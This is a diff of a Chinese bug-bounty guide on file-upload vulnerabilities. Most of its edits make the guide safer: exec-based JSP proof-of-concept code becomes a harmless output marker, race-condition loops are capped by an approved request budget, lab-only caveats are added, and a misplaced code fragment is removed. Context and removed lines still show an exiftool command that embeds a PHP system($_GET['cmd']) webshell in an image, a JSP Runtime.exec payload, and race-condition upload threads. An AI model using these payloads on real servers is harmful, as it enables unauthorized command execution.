@@ -6,7 +6,7 @@
 
 文件上传 = 把不可信的字节存到服务器 + 后端能解析它。
 两层都得突破：(a) **绕过校验**，(b) **触发解析**。
-SRC 价值：成功 = 直接 RCE，P0；失败 = 受限上传，P2/P3。
+上传成功不等于 RCE；必须区分存储、可访问、脚本解析与命令执行，并按实际影响评分。
 
 ---
 
@@ -97,7 +97,9 @@ cat real.jpg shell.php > fake.jpg        # Linux
 exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
 ```
 
-### 3.5 Webshell 内容免杀
+### 3.5 历史脚本特征（非通用可执行代码）
+
+PHP 7 移除了 preg_replace /e；PHP 8 移除了 create_function，字符串 assert 不再求值。示例需按具体版本核对，不能宣称当前环境适用。
 
 | 类型 | 示例 |
 |------|------|
@@ -215,7 +217,7 @@ Content-Type: multipart/form-data; boundary=xxx
 Content-Disposition: form-data; name="file"; filename="poc-2025-05-09.jsp"
 Content-Type: image/jpeg
 
-<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>
+<%out.print("catalog-poc-" + (6 * 7));%>
 --xxx--
 
 # 响应
@@ -223,7 +225,7 @@ Content-Type: image/jpeg
 
 # 验证
 GET /uploads/20250509142312poc-2025-05-09.jsp
-→ uid=1001(tomcat) gid=1001(tomcat)
+→ catalog-poc-42（仅证明 JSP 求值，不证明 OS 命令执行）
 ```
 
 ### 7.3 CVSS
@@ -265,7 +267,7 @@ GET /uploads/20250509142312poc-2025-05-09.jsp
 
 ## 8. 不要做的事
 
-- **禁**：上传真正的 webshell（带后门、加密通道）。**只用最简单的 jsp/php**：`<%=Runtime.getRuntime().exec("id").getInputStream()%>`。
+- **禁**：上传真正的 webshell（带后门、加密通道）。在明确批准的隔离沙箱中使用无命令能力的固定标记：`<%out.print("catalog-poc-" + (6 * 7));%>`。仅打印 InputStream 对象本来也不能证明命令输出。
 - **禁**：上传后做提权、横向、植入持久化。
 - **禁**：上传可被他人误访问的内容（钓鱼页、外链脚本）。
 - **禁**：留下 webshell 不清理。报告里**主动**告知文件路径并请求删除。
@@ -293,6 +295,8 @@ _共 8 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 
 - Unrestricted Upload of File with Dangerous Type：5 条
 - Uncategorized → 手工归类：3 条
 
+
+> 下列高并发竞态、webshell、cron 和配置覆盖片段仅为隔离实验室历史参考，禁止照搬到生产。入口最小证明与禁止持久化的规则优先；不得使用无限上传循环、覆盖系统文件或批量下载敏感文件。复现需明确总请求预算、超时与本任务文件清理。
 
 ## Payload 库
 
@@ -731,7 +735,7 @@ def access_shell():
     if 'security_check' in r.text:
         print('[+] Race won!')
 
-for i in range(100):
+for i in range(APPROVED_REQUEST_BUDGET):
     t1 = threading.Thread(target=upload_shell)
     t2 = threading.Thread(target=access_shell)
     t1.start(); t2.start()
@@ -751,7 +755,7 @@ def upload_payload():
     files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
     requests.post('http://target/upload', files=files)
 
-for i in range(50):
+for i in range(APPROVED_REQUEST_BUDGET):
     t1 = threading.Thread(target=upload_htaccess)
     t2 = threading.Thread(target=upload_payload)
     t1.start(); t2.start()
@@ -1241,10 +1245,6 @@ _检测目标环境是否可能受空字节截断影响_
 ```
 # 空字节截断受影响的环境:
 # - PHP < 5.3.4 (底层C函数将\x00视为字符串结尾),
-        syntaxBreakdown: [
-          { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
-          { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
-        ]
 # - Java旧版本的File类
 # - 部分Python 2.x版本
 # - 使用C/C++扩展的程序
